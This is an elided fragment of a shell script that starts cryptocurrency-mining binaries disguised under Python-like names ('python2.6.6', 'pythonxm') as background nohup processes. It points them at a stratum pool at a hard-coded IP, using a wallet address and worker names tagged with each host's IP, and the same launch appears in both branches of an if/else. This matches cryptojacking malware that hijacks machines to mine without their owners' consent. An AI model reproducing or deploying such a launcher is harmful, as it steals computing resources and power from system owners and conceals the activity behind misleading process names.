...
then
    ...
    do
        ...
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_T4_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout
    done
else
    ...
    do
        ...
        nohup ./python2.6.6  -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.BO_OC_Other_$IPNAME@116.203.10.54:80  -G 2>> oout 1>> oout &
        nohup ./pythonxm -c config3.json 2>> oout 1>> oout &
        tail -f oout
    done
fi
